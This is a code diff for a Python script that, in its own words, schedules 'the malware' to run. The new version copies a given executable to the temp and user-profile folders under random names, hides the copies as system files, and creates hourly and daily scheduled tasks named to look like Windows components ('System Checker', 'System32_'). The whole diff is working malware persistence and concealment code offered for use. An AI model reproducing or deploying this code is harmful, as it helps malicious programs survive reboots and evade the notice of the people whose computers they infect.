@@ -2,32 +2,38 @@
 #This script aims to to add your exe file to task scheduler
 #Start
 
-#Batchfile to check for the process
-def create_baty(exe):
-    code = """@echo off
-cls
-TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "=" > ch
-findstr /B /I {} ch >nul
-if %errorlevel%==0  goto :pass
-goto :create
+from os import popen
+from random import randint
 
-:pass
-del ch >nul
-:create
-{} >nul
-del ch >nul""".format( exe,exe )
-    f = open( "System_Checker.bat","w" )
-    f.write(code)
-    f.close()
+def random_name():
+    return "Y" + str(randint(10,100))
 
-#Create a task to check for the task
+def make_copy_and_hide( old,new ):
+    old_file = open( old,"rb" )
+    new_file = open( new,"wb" )
+    old_data = old_file.read()
+    new_file.write( old_data )
+    old_file.close()
+    new_file.close()
+    blahah = popen( "attrib +s +h " + new ) #hiding the file
+
+#Create a task to to run the malware at specific times
 def create_checker(exe):
-    import os
-    x = os.popen("echo %temp%")
-    path = "\\".join( str( x.read().strip() ).split( "\\" )[:-1] )
-    full_path = path + "\\" + "System_Checker.bat"
-    if "System Checker" not in os.popen("schtasks /query").read().strip():
-        create_baty(exe)
-        blah = os.popen( 'SCHTASKS /CREATE /SC ONSTART /TN "System Checker" /TR {} >nul'.format( full_path ) )
+    x = popen("echo %temp%")
+    path1 = "\\".join( str( x.read().strip() ).split( "\\" )[:-1] )
+    new_name1 = random_name()
+    full_path1 = path1 + "\\" + new_name1 + ".exe"
+    make_copy_and_hide( exe,full_path1 )
+
+    x = popen("echo %USERPROFILE%")
+    new_name2 = random_name()
+    full_path2 = x.read().strip() + "\\" + new_name2 + ".exe"
+    make_copy_and_hide( exe,full_path2 )
+
+    if "System Checker" not in popen("schtasks /query").read().strip(): # Will Start every hour at the same time
+        blah = popen( 'SCHTASKS /CREATE /SC HOURLY /TN "System Checker" /TR {} >nul'.format( full_path1 ) )
+
+    elif "System32_" not in popen("schtasks /query").read().strip():  # Different name , path and runs every day not every hour
+        blah = popen( 'SCHTASKS /CREATE /SC daily /TN "System32_" /TR {} >nul'.format( full_path2 ) )
 
 create_checker(File)
